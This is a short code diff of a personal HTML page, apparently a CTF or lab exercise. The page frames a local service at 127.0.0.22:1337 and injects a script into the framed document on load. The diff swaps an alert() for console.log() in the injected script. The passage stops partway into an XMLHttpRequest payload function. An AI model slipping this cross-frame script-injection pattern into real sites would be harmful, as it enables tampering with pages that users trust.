@@ -7,15 +7,20 @@
 <body>
     <h1>sky-tears的个人主页</h1>
     <h1>Hello ~</h1>
-    <iframe src="http://127.0.0.22:1337/" width="100%" height="600px"></iframe>
+    <iframe id="myIframe" src="http://127.0.0.22:1337/" width="100%" height="600px"></iframe>
     <script>
-        document.getElementsByTagName('iframe')[0].onload = function() {
+        window.onload = function() {
+        var iframe = document.getElementById('myIframe');
+        
+        // 确保 iframe 已加载完成
+        iframe.onload = function() {
             var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             var script = iframeDoc.createElement('script');
             script.type = 'text/javascript';
-            script.text = "alert('Script injected into iframe!');";
+            script.text = "console.log('Script injected into iframe!');";
             iframeDoc.head.appendChild(script);
         };
+    };
     function get(){
 var xhr = new XMLHttpRequest();
 var payload = {
